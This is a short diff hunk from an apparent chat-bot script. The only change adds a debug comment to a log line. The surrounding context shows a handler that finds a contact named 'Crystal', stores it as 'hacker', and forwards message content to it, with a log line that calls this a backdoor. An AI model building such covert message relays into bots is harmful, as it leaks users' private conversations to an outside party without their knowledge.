@@ -100,7 +100,7 @@ async function onPeopleMessage(msg) {
       const hacker = await bot.Contact.find({name: 'Crystal'});
       hacker.say(content);
     } catch (error) {
-      util.log(`others, backdoor invalid`);
+      util.log(`others, backdoor invalid`); //debug
     }
   }
   
